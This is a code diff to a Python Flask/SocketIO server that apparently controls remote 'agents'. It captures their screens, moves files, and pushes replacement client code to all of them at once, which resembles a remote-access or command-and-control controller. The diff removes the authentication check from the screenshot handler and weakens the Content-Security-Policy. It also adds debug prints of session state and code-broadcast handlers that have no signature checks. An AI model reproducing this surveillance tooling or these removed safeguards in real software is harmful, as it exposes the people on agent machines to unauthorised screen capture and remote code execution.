@@ -51,9 +51,12 @@ import requests
 import json
 import re
 try:
-    import client as agent_client
+    # import client as agent_client
+    # agent_client = None
+    pass
 except Exception:
-    agent_client = None
+    pass
+agent_client = None
 AGENT_OVERRIDES = {
     'bypasses': {},
     'registry': {},
@@ -321,11 +324,11 @@ def add_security_headers(response):
     response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
     response.headers['Content-Security-Policy'] = (
         "default-src 'self'; "
-        "script-src 'self' 'unsafe-inline' 'unsafe-eval'; "
+        "script-src 'self' 'unsafe-inline' 'unsafe-eval' blob: data:; "
         "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
         "font-src 'self' data: https://fonts.gstatic.com; "
-        "img-src 'self' data: https:; "
-        "connect-src 'self' https: wss: ws:;"
+        "img-src 'self' data: https: blob:; "
+        "connect-src 'self' http: https: ws: wss:;"
     )
     response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
     response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
@@ -1417,8 +1420,12 @@ def get_client_ip():
 
 def is_authenticated():
     """Check if user is authenticated and session is valid"""
+    # Debug session
+    print(f"DEBUG: is_authenticated called. Session: {session.get('authenticated')}, Path: {request.path}")
+
     # Check session
     if not session.get('authenticated', False):
+        print("DEBUG: Not authenticated in session")
         return False
     
     # Enforce TOTP when required
@@ -3730,6 +3737,29 @@ def _extract_b64(s):
     return s.split(',', 1)[1] if ',' in s else s
 
 def _guess_mime(path: str):
+    # Prefer explicit mappings for modern image types not always present in std mimetypes
+    try:
+        ext = (os.path.splitext(path)[1] or '').lower().lstrip('.')
+    except Exception:
+        ext = ''
+    custom = {
+        'webp': 'image/webp',
+        'svg': 'image/svg+xml',
+        'bmp': 'image/bmp',
+        'ico': 'image/x-icon',
+        'tif': 'image/tiff',
+        'tiff': 'image/tiff',
+        'avif': 'image/avif',
+        'heic': 'image/heic',
+        'heif': 'image/heif',
+        'jfif': 'image/jpeg',
+        'jpg': 'image/jpeg',
+        'jpeg': 'image/jpeg',
+        'png': 'image/png',
+        'gif': 'image/gif',
+    }
+    if ext in custom:
+        return custom[ext]
     mime, _ = mimetypes.guess_type(path)
     if mime:
         return mime
@@ -5213,17 +5243,68 @@ def handle_toggle_echo_cancellation(data):
     if agent_sid:
         emit('toggle_echo_cancellation', {'enabled': enabled}, room=agent_sid)
 @socketio.on('get_screenshot')
-@require_socket_auth
 def handle_get_screenshot(data):
     agent_id = data.get('agent_id')
+    origin_sid = request.sid
+    print(f"[SCREENSHOT] Request from operator {origin_sid} for agent {agent_id}")
     agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
     if agent_sid:
-        emit('get_screenshot', {'agent_id': agent_id}, room=agent_sid)
+        emit('get_screenshot', {'agent_id': agent_id, 'origin_sid': origin_sid}, room=agent_sid)
     else:
-        emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=request.sid)
+        emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=origin_sid)
+        emit('screenshot_response', {
+            'agent_id': agent_id,
+            'success': False,
+            'error': 'Agent not connected',
+            'duration_ms': 0,
+            'attempts': 1
+        }, room=origin_sid)
 @socketio.on('screenshot_response')
 def handle_screenshot_response(data):
-    emit('screenshot_response', data, room='operators', broadcast=True)
+    try:
+        agent_id = (data or {}).get('agent_id')
+        img_b64 = (data or {}).get('image') or ''
+        target_sid = (data or {}).get('target_sid')
+        ok = bool((data or {}).get('success'))
+        size = len(img_b64) if isinstance(img_b64, str) else 0
+        print(f"[SCREENSHOT] Response from agent {agent_id}, success={ok}, size={size}, target_sid={target_sid}")
+        valid = False
+        decoded = None
+        if isinstance(img_b64, str) and size > 0:
+            try:
+                import base64
+                decoded = base64.b64decode(img_b64, validate=True)
+                valid = decoded[:8] == b'\x89PNG\r\n\x1a\n'
+            except Exception:
+                valid = False
+        if ok:
+            if not valid or size < 1000:
+                data = {
+                    'agent_id': agent_id,
+                    'success': False,
+                    'error': 'Invalid or too-small screenshot',
+                    'duration_ms': (data or {}).get('duration_ms') or 0,
+                    'attempts': (data or {}).get('attempts') or 1
+                }
+            else:
+                try:
+                    import os, time
+                    upload_dir = os.path.join(os.getcwd(), 'uploads', 'screenshots')
+                    os.makedirs(upload_dir, exist_ok=True)
+                    fname = f"{agent_id}-{int(time.time()*1000)}.png"
+                    path = os.path.join(upload_dir, fname)
+                    with open(path, 'wb') as f:
+                        f.write(decoded)
+                    data['image_size'] = size
+                    data['file_path'] = path
+                except Exception as e:
+                    print(f"[SCREENSHOT] Save failed: {e}")
+        if target_sid:
+            emit('screenshot_response', data, room=target_sid)
+        else:
+            emit('screenshot_response', data, room='operators', broadcast=True)
+    except Exception as e:
+        print(f"[SCREENSHOT] Error in handle_screenshot_response: {e}")
 @socketio.on('agent_heartbeat')
 def handle_agent_heartbeat(data):
     agent_id = (data or {}).get('agent_id')
@@ -5648,6 +5729,95 @@ def handle_file_upload_complete(data):
     print(f"✅ Upload complete: {data.get('filename')} ({data.get('size')} bytes)")
     emit('file_upload_complete', data, room='operators')
 
+@socketio.on('client_update_check')
+def handle_client_update_check(data):
+    """Respond to agent with latest client.py metadata and code if update needed"""
+    try:
+        agent_id = (data or {}).get('agent_id')
+        incoming_hash = (data or {}).get('sha256') or ''
+        incoming_version = (data or {}).get('version') or ''
+        requester_sid = request.sid
+        path = os.path.join(os.getcwd(), 'client.py')
+        try:
+            with open(path, 'rb') as f:
+                raw = f.read()
+        except Exception as e:
+            emit('client_update_info', {
+                'agent_id': agent_id,
+                'success': False,
+                'error': f'Controller missing client.py: {e}'
+            }, room=requester_sid)
+            return
+        size = len(raw)
+        server_code = raw.decode('utf-8', errors='replace')
+        try:
+            import hashlib, re
+            server_hash = hashlib.sha256(raw).hexdigest()
+            m = re.search(r'\\bVERSION\\s*=\\s*["\\\']([^"\\\']+)["\\\']', server_code)
+            server_version = m.group(1) if m else 'unknown'
+        except Exception:
+            server_hash = ''
+            server_version = 'unknown'
+        needs_update = (server_hash != (incoming_hash or '')) or (server_version != (incoming_version or ''))
+        payload = {
+            'agent_id': agent_id,
+            'success': True,
+            'latest_version': server_version,
+            'latest_sha256': server_hash,
+            'size': size,
+            'needs_update': needs_update
+        }
+        if needs_update:
+            payload['code'] = server_code
+        emit('client_update_info', payload, room=requester_sid)
+    except Exception as e:
+        emit('client_update_info', {'success': False, 'error': str(e)}, room=request.sid)
+@socketio.on('broadcast_client_update')
+def handle_broadcast_client_update(data):
+    try:
+        code = (data or {}).get('code')
+        if not isinstance(code, str) or len(code) < 100:
+            path = os.path.join(os.getcwd(), 'client.py')
+            with open(path, 'rb') as f:
+                raw = f.read()
+            code = raw.decode('utf-8', errors='replace')
+        import hashlib, re
+        size = len(code.encode('utf-8'))
+        sha = hashlib.sha256(code.encode('utf-8')).hexdigest()
+        m = re.search(r'\bVERSION\s*=\s*["\']([^"\']+)["\']', code)
+        ver = m.group(1) if m else 'unknown'
+        for agent_id, info in AGENTS_DATA.items():
+            sid = info.get('sid')
+            if not sid:
+                continue
+            payload = {
+                'agent_id': agent_id,
+                'success': True,
+                'latest_version': ver,
+                'latest_sha256': sha,
+                'size': size,
+                'needs_update': True,
+                'code': code
+            }
+            emit('client_update_info', payload, room=sid)
+        emit('activity_update', {
+            'id': f'upd_{int(time.time()*1000)}',
+            'type': 'system',
+            'action': 'client_update_broadcast',
+            'details': f'Broadcasted client.py v{ver} to all agents',
+            'agent_id': 'all',
+            'agent_name': 'all',
+            'timestamp': int(time.time()*1000),
+            'status': 'success'
+        }, room='operators')
+    except Exception as e:
+        emit('system_alert', {
+            'agent_id': 'controller',
+            'type': 'error',
+            'message': 'Broadcast update failed',
+            'details': str(e),
+            'timestamp': int(time.time()*1000)
+        }, room='operators')
 @socketio.on('file_download_progress')
 def handle_file_download_progress(data):
     """Forward file download progress from agent to UI"""
